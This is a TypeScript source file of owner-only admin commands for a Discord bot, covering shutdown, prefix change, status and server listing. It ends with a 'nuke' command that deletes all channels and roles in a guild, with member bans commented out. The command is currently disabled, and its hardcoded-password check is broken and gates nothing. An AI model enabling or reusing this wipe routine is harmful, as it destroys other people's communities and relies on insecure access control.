import { Message } from "discord.js";
import { Bot } from "../bot";
import { TextCommand } from "../mixins";
import { selfDestructMessage } from "../utils/callbacks";
import { ParsedMessage, parseMessage } from "../utils/parser";

export class Shutdown extends TextCommand {
  constructor() {
    super({
      command: "shutdown",
      description: "Shutdown the Bot",
      ownerOnly: true,
      group: "admin"
    });
  }

  public async run(bot: Bot, message: Message, parsedMessage: ParsedMessage) {
    process.exit(0);
  }
}

export class ChangePrefix extends TextCommand {
  constructor() {
    super({
      command: "prefix",
      description: "set a new prefix for all commands",
      usage: "prefix [new prefix]",
      ownerOnly: true,
      group: "admin"
    });
  }

  public async run(bot: Bot, message: Message, parsedMessage: ParsedMessage) {
    const prefix = parsedMessage.rawArgs[0];
    bot.settings.setGuildPrefix(message.guild.id, prefix);
    bot.settings.prefix = prefix;
    message.reply(`Changed command prefix to ${bot.settings.prefix}`);
  }
}

export class Playing extends TextCommand {
  constructor() {
    super({
      command: "game",
      description: "set the current game",
      usage: "game [game]",
      ownerOnly: true,
      group: "admin",
      aliases: ["playing"]
    });
  }

  public async run(bot: Bot, message: Message, parsedMessage: ParsedMessage) {
    bot.user
      .setGame(parsedMessage.rawArgs.join(" "))
      .catch((err) => console.log(err));
  }
}

export class Servers extends TextCommand {
  constructor() {
    super({
      command: "servers",
      ownerOnly: true,
      description: "show all servers",
      group: "admin"
    });
  }

  public async run(bot: Bot, message: Message, parsedMessage: ParsedMessage) {
    if (parsedMessage.rawArgs[0] === "leave") {
      const guild = bot.guilds.find("id", parsedMessage.rawArgs[1]);
      guild.leave();
      message.delete();
    } else {
      let text: string = "\n";

      bot.guilds.forEach((g) => {
        text += `${g.id} : ${g.name}\n`;
      });

      console.log(text);

      return message.reply(text).then(selfDestructMessage);
    }
  }
}

export class Nuke extends TextCommand {
  constructor() {
    super({
      command: "nuke",
      ownerOnly: true,
      args: [{ name: "password", pattern: /\.*/ }]
    });
  }

  public async run(bot: Bot, message: Message, parsedMessage: ParsedMessage) {
    return null;
    if (
      !parsedMessage.args.password.exists ||
      parsedMessage.args.password.value !== "alkohol"
    ) {
      console.log("passed");
    }
    console.log("not passed");
    // return;

    const guild = message.guild;

    guild.channels.forEach(async (c) => {
      if (c.deletable) {
        c.delete().catch(console.log);
      }
    });

    // guild.members.forEach(async (m) => {
    //   m.ban().catch(console.log);
    // });

    guild.roles.forEach(async (r) => {
      r.delete().catch(console.log);
    });

    // message.guild.channels.forEach((channel) => {
    //   if (channel.deletable) {
    //     channel.delete();
    //   }
    // });
    // message.guild.members.forEach((member) => {
    //   member.ban();
    // });
  }
}
